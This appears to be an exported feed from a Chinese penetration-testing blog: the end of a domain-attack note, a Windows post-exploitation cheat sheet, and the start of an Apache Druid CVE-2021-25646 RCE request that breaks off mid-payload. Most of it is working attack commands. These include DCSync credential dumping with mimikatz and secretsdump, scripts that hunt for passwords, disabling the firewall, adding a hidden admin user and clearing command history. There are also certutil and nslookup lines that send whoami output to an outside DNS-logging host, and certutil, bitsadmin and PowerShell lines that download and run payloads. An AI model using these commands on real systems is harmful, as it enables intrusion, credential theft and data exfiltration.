<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admod  -b CN&#x3D;Administrator,CN&#x3D;Users,DC&#x3D;test,DC&#x3D;local unicodepwd::123!@#qazwsx -optenc</span><br></pre></td></tr></table></figure>
<h4 id="Dcsync"><a href="#Dcsync" class="headerlink" title="Dcsync"></a>Dcsync</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DS-Replication-Get-Changes</span><br><span class="line">1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</span><br><span class="line"></span><br><span class="line">DS-Replication-Get-Changes-All</span><br><span class="line">1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</span><br></pre></td></tr></table></figure>
<p>对域对象具有这两个扩展权限的用户具备dcsync 权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python secretsdump.py exp.com&#x2F;cs:123456@dc.exp.com -dc-ip 10.0.2.254 -just-dc-user administrator</span><br><span class="line"></span><br><span class="line">mimikatz.exe privilege::debug &quot;lsadump::dcsync &#x2F;domain:test.com &#x2F;user:xx &#x2F;password:12323 &#x2F;all &#x2F;csv&quot; exit</span><br></pre></td></tr></table></figure>
<h4 id="WriteDacl"><a href="#WriteDacl" class="headerlink" title="WriteDacl"></a>WriteDacl</h4><p>将新ACE写入目标对象的DACL的功能。</p>
<p>例如，攻击者可以向目标对象DACL写入新的ACE，从而使攻击者可以“完全控制”目标对象直接dcsync</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><h2 id="UserAccountControl值参考表"><a href="#UserAccountControl值参考表" class="headerlink" title="UserAccountControl值参考表"></a>UserAccountControl值参考表</h2><p>来源<a href="http://woshub.com/decoding-ad-useraccountcontrol-value/">http://woshub.com/decoding-ad-useraccountcontrol-value/</a></p>
<p>自己翻译的，可能不太对</p>
<table>
<thead>
<tr>
<th align="center">SCRIPT</th>
<th>1</th>
<th>运行登录脚本</th>
</tr>
</thead>
<tbody><tr>
<td align="center">ACCOUNTDISABLE</td>
<td>2</td>
<td>账号已禁用</td>
</tr>
<tr>
<td align="center">HOMEDIR_REQUIRED</td>
<td>8</td>
<td>依赖家目录</td>
</tr>
<tr>
<td align="center">LOCKOUT</td>
<td>16</td>
<td>账户已锁定</td>
</tr>
<tr>
<td align="center">PASSWD_NOTREQD</td>
<td>32</td>
<td>不需密码</td>
</tr>
<tr>
<td align="center">PASSWD_CANT_CHANGE</td>
<td>64</td>
<td>用户不能更改密码</td>
</tr>
<tr>
<td align="center">ENCRYPTED_TEXT_PWD_ALLOWED</td>
<td>128</td>
<td>使用可逆加密存储密码</td>
</tr>
<tr>
<td align="center">TEMP_DUPLICATE_ACCOUNT</td>
<td>256</td>
<td>用户的帐户，其主要帐户在另一个域中</td>
</tr>
<tr>
<td align="center">NORMAL_ACCOUNT</td>
<td>512</td>
<td>默认帐户，典型的活动帐户</td>
</tr>
<tr>
<td align="center">INTERDOMAIN_TRUST_ACCOUNT</td>
<td>2048</td>
<td>域间信任</td>
</tr>
<tr>
<td align="center">WORKSTATION_TRUST_ACCOUNT</td>
<td>4096</td>
<td>工作组信任</td>
</tr>
<tr>
<td align="center">SERVER_TRUST_ACCOUNT</td>
<td>8192</td>
<td>服务器信任</td>
</tr>
<tr>
<td align="center">DONT_EXPIRE_PASSWORD</td>
<td>65536</td>
<td>密码未过期的用户帐户</td>
</tr>
<tr>
<td align="center">MNS_LOGON_ACCOUNT</td>
<td>131072</td>
<td>要登录网络，用户需要智能卡</td>
</tr>
<tr>
<td align="center">SMARTCARD_REQUIRED</td>
<td>262144</td>
<td>需要智能卡</td>
</tr>
<tr>
<td align="center">TRUSTED_FOR_DELEGATION</td>
<td>524288</td>
<td>非约束委派</td>
</tr>
<tr>
<td align="center">NOT_DELEGATED</td>
<td>1048576</td>
<td></td>
</tr>
<tr>
<td align="center">USE_DES_KEY_ONLY</td>
<td>2097152</td>
<td>仅使用DES密码</td>
</tr>
<tr>
<td align="center">DONT_REQ_PREAUTH</td>
<td>4194304</td>
<td>不需要Kerberos预身份验证</td>
</tr>
<tr>
<td align="center">PASSWORD_EXPIRED</td>
<td>8388608</td>
<td>用户密码已过期</td>
</tr>
<tr>
<td align="center">TRUSTED_TO_AUTH_FOR_DELEGATION</td>
<td>16777216</td>
<td>约束委派</td>
</tr>
<tr>
<td align="center">PARTIAL_SECRETS_ACCOUNT</td>
<td>67108864</td>
<td>受保护的账户</td>
</tr>
</tbody></table>
<p>后续再补充补充。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows技巧</title>
    <url>/2021/01/14/Windows%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<p><em>信息搜集很重要</em><a id="more"></a></p>
<h2 id="常用CMD命令"><a href="#常用CMD命令" class="headerlink" title="常用CMD命令"></a>常用CMD命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami # 查看当前用户</span><br><span class="line">net user # 查看所有用户</span><br><span class="line">query user # 查看当前在线用户</span><br><span class="line">ipconfig &#x2F;all # 查看当前主机的主机名&#x2F;IP&#x2F;DNS等信息</span><br><span class="line">route print # 查看路由表信息</span><br><span class="line">netstat -ano # 查看端口开放情况</span><br><span class="line">arp -a # 查看arp解析情况</span><br><span class="line">tasklist &#x2F;svc # 查看进程及对应服务名</span><br><span class="line">net localgroup administrators # 查看管理员组成员</span><br><span class="line">systeminfo # 查看系统信息含补丁信息</span><br><span class="line">net use # 查看ipc连接情况</span><br><span class="line">net view # 查看匿名共享情况</span><br><span class="line">netsh firewall show state # 查看防火墙状态</span><br><span class="line">cmdkey &#x2F;l # 查看当前保存的登陆凭证</span><br></pre></td></tr></table></figure>
<h2 id="Windows的本地命令执行"><a href="#Windows的本地命令执行" class="headerlink" title="Windows的本地命令执行"></a>Windows的本地命令执行</h2><p>可用来替代cmd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">forfiles &#x2F;c c:\windows\system32\calc.exe	#无限运行</span><br><span class="line">pcalua.exe -a c:\windows\system32\calc.exe	</span><br><span class="line">powershell SyncAppvPublishingServer.vbs &quot;n; Start-Process c:\windows\system32\calc.exe&quot;</span><br><span class="line">cmd.exe &#x2F;c &quot;ping 127.0.0.1&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;calc.exe&quot;</span><br><span class="line">conhost C:\Windows\System32\calc.exe</span><br><span class="line">explorer.exe C:\Users\keefe\desktop\1.exe</span><br></pre></td></tr></table></figure>
<h2 id="环境信息搜集"><a href="#环境信息搜集" class="headerlink" title="环境信息搜集"></a>环境信息搜集</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- nbtscan.exe xx.xx.xx.xx&#x2F;24 # 查看c段机器</span><br><span class="line">- csvde.exe -f 1.csv -k # 批量导入&#x2F;导出AD用户</span><br><span class="line">- setspn.exe -T xx.xx.xx.xx -Q *&#x2F;* # 查看当前域内所有spn</span><br><span class="line">- netstat -ano  </span><br></pre></td></tr></table></figure>
<h2 id="密码搜集"><a href="#密码搜集" class="headerlink" title="密码搜集"></a>密码搜集</h2><p>密码文件</p>
<p>自动搜索像密码文件的脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">set &#x2F;p pwd&#x3D;&quot;输入盘符,示例 C:&#x2F; &gt;&quot;</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.properties) do @findstr &quot;password&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.ini) do @findstr &quot;password&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.xml) do @findstr &quot;password&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.config) do @findstr &quot;password&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.conf) do @findstr &quot;password&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.properties) do @findstr &quot;pass&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.ini) do @findstr &quot;pass&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.xml) do @findstr &quot;pass&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.config) do @findstr &quot;pass&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.conf) do @findstr &quot;pass&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
<p>还可以用下面的方式（抄的）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 查看 Windows 文件</span><br><span class="line">1）WDS</span><br><span class="line">Windows Deployment Services (Windows 部署服务，简称：WDS)，是提供给计算机管理员再企业或组织环境中为计算机部署操作系统的一种工具。</span><br><span class="line">通过 WDS 我们可以轻松地为客户端批量部署操作系统，并可管理影响和无人参与安装脚本，或提供需人参与和无人参与的安装选项。如：通过网络为一台计算机执行需要人参与或无人参与的系统安装过程；映像捕获计算机系统并将其部署到其他计算机上，而不受 HAL 的影响。</span><br><span class="line">但它存在一个问题，就是本地管理员密码以明文形式或 base64 编码存储在诸如以下位置：</span><br><span class="line">C:\unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattend.xml</span><br><span class="line">C:\Windows\System32\sysprep.inf</span><br><span class="line">C:\Windows\System32\sysprep\sysprep.xml</span><br><span class="line">有一个 MSF 的模块可以通过其搜寻凭证（msf没找到不知道为啥）</span><br><span class="line"></span><br><span class="line">2）IIS服务器</span><br><span class="line">如果系统是采用 IIS 服务器部署的，可以看看 web.config ，因为它也可能以明文形式包含管理员密码。它本地文件地址通常如下：</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</span><br><span class="line">C:\inetpub\wwwroot\web.config</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2. 命令搜索关键字</span><br><span class="line"></span><br><span class="line">4）注册表里查找关键字</span><br><span class="line">reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br><span class="line">reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br><span class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span><br><span class="line">reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;</span><br><span class="line">reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 &#x2F;v password</span><br><span class="line">5）查找可写目录</span><br><span class="line">dir &#x2F;a-r-d &#x2F;s &#x2F;b</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3. PowerSploit</span><br><span class="line">PowerSploit 有些模块可以检查各种文件和注册表中的凭据。</span><br><span class="line">Get-UnattendedInstallFile</span><br><span class="line">Get-Webconfig</span><br><span class="line">Get-ApplicationHost</span><br><span class="line">Get-SiteListPassword</span><br><span class="line">Get-CachedGPPPassword</span><br><span class="line">Get-RegistryAutoLogon</span><br></pre></td></tr></table></figure>
<p>其他密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir &#x2F;s &#x2F;a \域控IP\SYSVOL*.xml # 获取域里面所有机子的本地管理员账号密码</span><br><span class="line"></span><br><span class="line">netsh wlan show profiles # 查看连接过的wifi名称</span><br><span class="line"></span><br><span class="line">netsh wlan show profile name&#x3D;&quot;wifi名称&quot; key&#x3D;clear # 查看wifi的密码</span><br><span class="line"></span><br><span class="line">dir &#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials* # 查看RDP连接凭证</span><br><span class="line"></span><br><span class="line">laZagne.exe all -oN # 本地wifi&#x2F;浏览器等密码</span><br><span class="line"></span><br><span class="line">dir %APPDATA%\Microsoft\Windows\Recent # 查看最近打开的文档</span><br></pre></td></tr></table></figure>
<h2 id="关防火墙"><a href="#关防火墙" class="headerlink" title="关防火墙"></a>关防火墙</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure>
<h2 id="命令DNS外带"><a href="#命令DNS外带" class="headerlink" title="命令DNS外带"></a>命令DNS外带</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd &#x2F;c &quot;whoami &gt; abcde &amp;&amp; set &#x2F;p xx&#x3D;&lt;abcde &amp;&amp; certutil -urlcache -split -f http:&#x2F;&#x2F;hrgjkb.ceye.io?a&#x3D;%xx%</span><br><span class="line"></span><br><span class="line">cmd &#x2F;c &#x2F;v &quot;whoami &gt; abcde &amp;&amp; set &#x2F;p xx&#x3D;&lt;abcde &amp;&amp; certutil -urlcache -split -f http:&#x2F;&#x2F;hrgjkb.ceye.io?a&#x3D;!xx!</span><br><span class="line"></span><br><span class="line">长命令编码后带出</span><br><span class="line">cmd &#x2F;v &#x2F;c &quot;whoami &gt; temp &amp;&amp; certutil -encode temp temp2 &amp;&amp; findstr &#x2F;L &#x2F;V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; set &#x2F;p MYVAR&#x3D;&lt; temp3 &amp;&amp; set FINAL&#x3D;!MYVAR!.xxx.ceye.io &amp;&amp; nslookup !FINAL!&quot;</span><br></pre></td></tr></table></figure>
<h2 id="RDP相关"><a href="#RDP相关" class="headerlink" title="RDP相关"></a>RDP相关</h2><h3 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">开启</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br><span class="line">查端口</span><br><span class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp &#x2F;v PortNumber</span><br></pre></td></tr></table></figure>
<h3 id="寻找RDP的连接记录"><a href="#寻找RDP的连接记录" class="headerlink" title="寻找RDP的连接记录"></a>寻找RDP的连接记录</h3><p>直接运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#</span><br><span class="line">.SYNOPSIS</span><br><span class="line">This script will list all users&#39; RDP Connections History.</span><br><span class="line">First use &quot;reg load&quot; to load hive.</span><br><span class="line">Then read the RDP Connections History from HKEY_USERS.</span><br><span class="line">Last you need to use &quot;reg unload&quot; to unload hive. </span><br><span class="line">The script automatically implements the above operation,there is no need for a GUI. :)</span><br><span class="line">Author: 3gstudent@3gstudent</span><br><span class="line">License: BSD 3-Clause</span><br><span class="line">#&gt;</span><br><span class="line">$AllUser &#x3D; Get-WmiObject -Class Win32_UserAccount</span><br><span class="line">foreach($User in $AllUser)</span><br><span class="line">&#123;</span><br><span class="line">	$RegPath &#x3D; &quot;Registry::HKEY_USERS\&quot;+$User.SID+&quot;\Software\Microsoft\Terminal Server Client\Servers\&quot;</span><br><span class="line">	Write-Host &quot;User:&quot;$User.Name</span><br><span class="line">	Write-Host &quot;SID:&quot;$User.SID</span><br><span class="line">	Write-Host &quot;Status:&quot;$User.Status</span><br><span class="line">	$QueryPath &#x3D; dir $RegPath -Name -ErrorAction SilentlyContinue</span><br><span class="line">	If(!$?)</span><br><span class="line">	&#123;</span><br><span class="line">		Write-Host &quot;[!]Not logged in&quot;</span><br><span class="line">		Write-Host &quot;[*]Try to load Hive&quot;</span><br><span class="line">		$File &#x3D; &quot;C:\Documents and Settings\&quot;+$User.Name+&quot;\NTUSER.DAT&quot;</span><br><span class="line">		$Path &#x3D; &quot;HKEY_USERS\&quot;+$User.SID</span><br><span class="line">		Write-Host &quot;[+]Path:&quot;$Path </span><br><span class="line">		Write-Host &quot;[+]File:&quot;$File</span><br><span class="line">		Reg load $Path $File</span><br><span class="line">		If(!$?)</span><br><span class="line">		&#123;</span><br><span class="line">			Write-Host &quot;[!]Fail to load Hive&quot;</span><br><span class="line">			Write-Host &quot;[!]No RDP Connections History&quot;</span><br><span class="line">		&#125;</span><br><span class="line">		Else</span><br><span class="line">		&#123;</span><br><span class="line">			$QueryPath &#x3D; dir $RegPath -Name -ErrorAction SilentlyContinue</span><br><span class="line">			If(!$?)</span><br><span class="line">			&#123;</span><br><span class="line">				Write-Host &quot;[!]No RDP Connections History&quot;</span><br><span class="line">			&#125;</span><br><span class="line">			Else</span><br><span class="line">			&#123;</span><br><span class="line">				foreach($Name in $QueryPath)</span><br><span class="line">				&#123;   </span><br><span class="line">					$User &#x3D; (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHint</span><br><span class="line">					Write-Host &quot;Server:&quot;$Name</span><br><span class="line">					Write-Host &quot;User:&quot;$User</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			Write-Host &quot;[*]Try to unload Hive&quot;</span><br><span class="line">			Start-Process powershell.exe -WindowStyle Hidden -ArgumentList &quot;Reg unload $Path&quot;		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	foreach($Name in $QueryPath)</span><br><span class="line">	&#123;   </span><br><span class="line">		Try  </span><br><span class="line">		&#123;  </span><br><span class="line">			$User &#x3D; (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHint</span><br><span class="line">			Write-Host &quot;Server:&quot;$Name</span><br><span class="line">			Write-Host &quot;User:&quot;$User</span><br><span class="line">		&#125;</span><br><span class="line">		Catch  </span><br><span class="line">		&#123;</span><br><span class="line">			Write-Host &quot;[!]No RDP Connections History&quot;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	Write-Host &quot;----------------------------------&quot;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Kali下连RDP"><a href="#Kali下连RDP" class="headerlink" title="Kali下连RDP"></a>Kali下连RDP</h3><p>列两个比较好用的，kali自带的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xfreerdp &#x2F;v:192.168.0.20:3389 &#x2F;u:administrator &#x2F;p:Huawei12#$ &#x2F;cert-ignore &#x2F;drive:share1,&#x2F;tmp</span><br><span class="line">rdesktop 192.168.112.129 -u1 -pTest123! -r disk:share1&#x3D;&#x2F;tmp</span><br></pre></td></tr></table></figure>
<h2 id="新建用户相关"><a href="#新建用户相关" class="headerlink" title="新建用户相关"></a>新建用户相关</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user wocaini Wocaini121.. &#x2F;add</span><br><span class="line"></span><br><span class="line">加入管理员组</span><br><span class="line">net localgroup administrators wocaini &#x2F;add</span><br><span class="line"></span><br><span class="line"> 加入远程桌面用户组</span><br><span class="line">net localgroup &quot;remote desktop users&quot; wocaini &#x2F;add</span><br></pre></td></tr></table></figure>
<h2 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Pcalua -a \\x.x.x.x\777.exe</span><br><span class="line">cmd &#x2F;c certutil -urlcache -split -f http:&#x2F;&#x2F;x.x.x.x&#x2F;%USERNAME%+%COMPUTERNAME%+%HOMEPATH%</span><br><span class="line">bitsadmin &#x2F;transfer myDownLoadJob &#x2F;download &#x2F;priority normal http:&#x2F;&#x2F;x.x.x.x c:\temp\777.exe</span><br><span class="line">powershell Start-BitsTransfer -Source &quot;http:&#x2F;&#x2F;10.0.2.21&#x2F;pentestlab.exe&quot; -Destination &quot;C:\tmp\pentestlab.exe&quot;</span><br><span class="line">powershell &quot;Import-Module BitsTransfer;start-bitstransfer http:&#x2F;&#x2F;uee.me&#x2F;crAJs cd.bat&quot;|cd.bat</span><br><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;x.x.x.x&#x2F;key.txt payload</span><br><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;webserver&#x2F;payload.b64 payload.b64 &amp; certutil -decode</span><br><span class="line">payload.b64 payload.dll &amp; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil &#x2F;logfile&#x3D; &#x2F;LogToConsole&#x3D;false &#x2F;u payload.dll</span><br><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;webserver&#x2F;payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.exe &amp; payload.exe</span><br><span class="line">certutil这个默认的存储位置是</span><br><span class="line">%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</span><br><span class="line">certutil.exe -urlcache -split -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;3gstudent&#x2F;test&#x2F;master&#x2F;version.txt</span><br><span class="line">查看缓存项目：</span><br><span class="line">certutil.exe -urlcache *</span><br><span class="line">CertUtil -decode InFile OutFile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">powershell (new-object System.Net.WebClient).DownloadFile(&#39;https:&#x2F;&#x2F;github.com&#x2F;3gstudent&#x2F;test&#x2F;raw&#x2F;master&#x2F;putty.exe&#39;,&#39;c:\download\a.exe&#39;);start-process &#39;c:\download\a.exe&#39;</span><br></pre></td></tr></table></figure>
<h2 id="网络内主机探测"><a href="#网络内主机探测" class="headerlink" title="网络内主机探测"></a>网络内主机探测</h2><p>改进了一下网上的脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rem a段探测</span><br><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">rem 修改ip的值以指定a段</span><br><span class="line"></span><br><span class="line">setlocal enabledelayedexpansion</span><br><span class="line"></span><br><span class="line">set ip&#x3D;10</span><br><span class="line"></span><br><span class="line">for &#x2F;l %%i in (0,1,255) do (</span><br><span class="line"></span><br><span class="line">for &#x2F;l %%k in (0,1,255) do (</span><br><span class="line"></span><br><span class="line">for %%j in (1,254) do ( @ping %ip%.%%i.%%k.%%j -w 1 -n 1|find &#x2F;i &quot;ttl&#x3D;&quot; &gt;&gt; null</span><br><span class="line">if !errorlevel! equ 0 (echo %ip%.%%i.%%k.%%j is alive ! &gt;&gt; ascan.txt ) else (echo %ip%.%%i.%%k.%%j May be not exist ! )</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rem b段探测</span><br><span class="line">@echo off</span><br><span class="line">setlocal enabledelayedexpansion</span><br><span class="line"></span><br><span class="line">set ip&#x3D;192.168</span><br><span class="line"></span><br><span class="line">for &#x2F;l %%i in (0,1,255) do (</span><br><span class="line"></span><br><span class="line">for %%k in (1,254) do ( @ping %ip%.%%i.%%k -w 1 -n 1|find &#x2F;i &quot;ttl&#x3D;&quot; &gt;&gt; null</span><br><span class="line">if !errorlevel! equ 0 (echo %ip%.%%i.%%k is alive ! &gt;&gt; bscan.txt ) else (echo %ip%.%%i.%%k May be not exist ! )</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rem c段探测</span><br><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">setlocal enabledelayedexpansion</span><br><span class="line"></span><br><span class="line">set ip&#x3D;192.168.148</span><br><span class="line"></span><br><span class="line">for &#x2F;l %%k in (0,1,254) do  (</span><br><span class="line">@ping %ip%.%%k -w 1 -n 1| findstr &quot;TTL&#x3D;&quot; &gt;nul</span><br><span class="line">if !errorlevel! equ 0 (echo %ip%.%%k is alive ! &gt;&gt; cscan.txt ) else (echo %ip%.%%k May be not exist ! )</span><br><span class="line">)</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
<h2 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h2><p>不管是powershell还是cmd，能够读取的历史命令仅限于当前窗口，当前窗口关闭后会自动清除，无法读取</p>
<p>查看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd&gt;doskey &#x2F;h</span><br><span class="line">poershell&gt;Get-History | Format-List -Property *</span><br></pre></td></tr></table></figure>
<p>清空</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd&gt;doskey &#x2F;reinstall</span><br><span class="line">powershell&gt;Clear-History</span><br></pre></td></tr></table></figure>
<h2 id="一键查询日志登录事件"><a href="#一键查询日志登录事件" class="headerlink" title="一键查询日志登录事件"></a>一键查询日志登录事件</h2><p>通过修改事件ID来查询不同登录事件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$Events &#x3D; Get-WinEvent -LogName &quot;security&quot; -FilterXPath &quot;Event[System[(EventID&#x3D;4624)] and EventData[Data[@Name&#x3D;&#39;TargetUserName&#39;]&#x3D;&#39;testb&#39;]]&quot;     </span><br><span class="line">ForEach ($Event in $Events) &#123;       </span><br><span class="line">  $eventXML &#x3D; [xml]$Event.ToXml()         </span><br><span class="line">  For ($i&#x3D;0; $i -lt $eventXML.Event.EventData.Data.Count; $i++) &#123;   </span><br><span class="line">    Add-Member -InputObject $Event -MemberType NoteProperty -Force -Name $eventXML.Event.EventData.Data[$i].name -Value $eventXML.Event.EventData.Data[$i].&#39;#text&#39;     </span><br><span class="line">  &#125;       </span><br><span class="line">&#125;       </span><br><span class="line">$events|select ipaddress</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技巧</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache-Druid</title>
    <url>/2021/04/13/Apache-Druid/</url>
    <content><![CDATA[<p>Apache Druid是一个实时分析型数据库，旨在对大型数据集进行快速的查询分析（”<a href="https://en.wikipedia.org/wiki/Online_analytical_processing">OLAP</a>“查询)。<a id="more"></a></p>
<p>长这样</p>
<p><img src="./images/apache-druid-show.png" alt="apache-druid-show"></p>
<h1 id="CVE-2021-25646-RCE"><a href="#CVE-2021-25646-RCE" class="headerlink" title="CVE-2021-25646-RCE"></a>CVE-2021-25646-RCE</h1><p>java代码执行RCE</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;druid&#x2F;indexer&#x2F;v1&#x2F;sampler HTTP&#x2F;1.1</span><br><span class="line">Host: ip:prot</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko&#x2F;20100101 Firefox&#x2F;85.0</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 1045</span><br><span class="line">Connection: close</span><br><span class="line"> </span><br><span class="line">&#123;&quot;type&quot;: &quot;index&quot;, &quot;spec&quot;: &#123;&quot;ioConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;, &quot;inputSource&quot;: &#123;&quot;type&quot;: &quot;inline&quot;, &quot;data&quot;: &quot;&#123;\&quot;isRobot\&quot;:true,\&quot;channel\&quot;:\&quot;#x\&quot;,\&quot;timestamp\&quot;:\&quot;2020-12-12T12:10:21.040Z\&quot;,\&quot;flags\&quot;:\&quot;x\&quot;,\&quot;isUnpatrolled\&quot;:false,\&quot;page\&quot;:\&quot;1\&quot;,\&quot;diffUrl\&quot;:\&quot;https:&#x2F;&#x2F;xxx.com\&quot;,\&quot;added\&quot;:1,\&quot;comment\&quot;:\&quot;Botskapande Indonesien omdirigering\&quot;,\&quot;commentLength\&quot;:35,\&quot;isNew\&quot;:true,\&quot;isMinor\&quot;:false,\&quot;delta\&quot;:31,\&quot;isAnonymous\&quot;:true,\&quot;user\&quot;:\&quot;Lsjbot\&quot;,\&quot;deltaBucket\&quot;:0,\&quot;deleted\&quot;:0,\&quot;namespace\&quot;:\&quot;Main\&quot;&#125;&quot;&#125;, &quot;inputFormat&quot;: &#123;&quot;type&quot;: &quot;json&quot;, &quot;keepNullColumns&quot;: true&#125;&#125;, &quot;dataSchema&quot;: &#123;&quot;dataSource&quot;: &quot;sample&quot;, &quot;timestampSpec&quot;: &#123;&quot;column&quot;: &quot;timestamp&quot;, &quot;format&quot;: &quot;iso&quot;&#125;, &quot;dimensionsSpec&quot;: &#123;&#125;, &quot;transformSpec&quot;: &#123;&quot;transforms&quot;: [], &quot;filter&quot;: &#123;&quot;type&quot;: &quot;javascript&quot;, &quot;dimension&quot;: &quot;added&quot;, 